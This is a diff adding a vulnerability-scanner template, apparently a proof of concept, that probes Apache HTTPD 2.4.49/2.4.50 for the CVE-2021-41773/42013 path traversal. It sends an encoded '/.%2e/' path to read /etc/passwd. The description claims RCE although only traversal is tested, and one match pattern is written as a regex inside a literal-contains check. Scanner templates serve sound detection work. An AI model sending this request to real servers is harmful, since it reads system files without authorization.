@@ -1,0 +1,16 @@
+name: poc-apache-httpd-traversal
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+    expression: response.status == 200 && (response.body.bcontains("root:x:0:0") || response.body.bcontains("root:.*:0:0"))
+expression: r0()
+detail:
+  author: sxel
+  description: Apache HTTPD path traversal + RCE probe (CVE-2021-41773 / CVE-2021-42013, unpatched 2.4.49/2.4.50)
+  severity: critical
+  tags: apache,httpd,traversal,rce
